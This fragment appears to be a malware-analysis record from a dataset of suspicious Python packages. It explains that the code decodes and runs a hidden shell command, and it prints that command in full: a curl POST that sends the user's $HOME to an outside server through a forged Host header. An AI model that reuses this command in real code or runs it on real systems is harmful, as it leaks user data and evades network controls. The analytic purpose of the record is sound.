      "malicious_behavior": "The code decodes a base64-encoded string and executes it as a shell command using os.system. The decoded command is: 'curl -k -X POST \"https://pypi.org\" -H \"Host: psec.forward.io.global.prod.fastly.net\" -d \"test=$HOME\"'. This command sends a POST request to https://pypi.org with a custom Host header pointing to a suspicious domain (psec.forward.io.global.prod.fastly.net) and includes the environment variable $HOME in the POST data. This behavior can be considered malicious because it leaks potentially sensitive environment information (the user's home directory path) to an external server, which could be used for reconnaissance or further attacks. Additionally, the use of a forged Host header suggests an attempt to bypass security controls or perform host header injection attacks.",
